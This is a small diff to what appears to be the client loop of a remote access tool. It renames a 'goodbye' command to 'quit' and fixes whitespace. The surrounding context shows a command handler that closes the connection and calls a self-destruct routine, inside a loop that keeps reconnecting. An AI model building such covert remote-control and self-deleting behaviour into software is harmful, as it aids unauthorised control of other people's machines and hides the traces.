@@ -50,7 +50,7 @@ def client_loop(conn, dhkey):
             conn.close()
             toolkit.selfdestruct(PLAT)
 
-        elif cmd == 'goodbye':
+        elif cmd == 'quit':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
@@ -92,7 +92,7 @@ def client_loop(conn, dhkey):
 
 def main():
     exit_status = 0
-    
+
     while True:
         conn = socket.socket()
 
